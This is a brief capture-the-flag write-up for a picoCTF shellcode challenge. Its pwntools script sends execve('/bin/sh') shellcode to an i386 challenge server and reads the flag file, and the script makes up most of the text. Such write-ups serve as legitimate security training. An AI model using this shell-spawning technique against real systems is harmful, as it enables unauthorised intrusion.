Free shellcode, maximum 40 bytes.
Inspecting the given binary, we note that it is build for an i386 architecture, so we need to take that into account when building shellcode.
The executing goes quickly from then, with pwntools:
```
from pwn import *
context.arch = "i386"
r = remote("shell2017.picoctf.com", <port>)
r.read()
r.sendline(asm(shellcraft.execve("/bin/sh")))
r.sendline("cat ./flag.txt")
print(r.read())
```
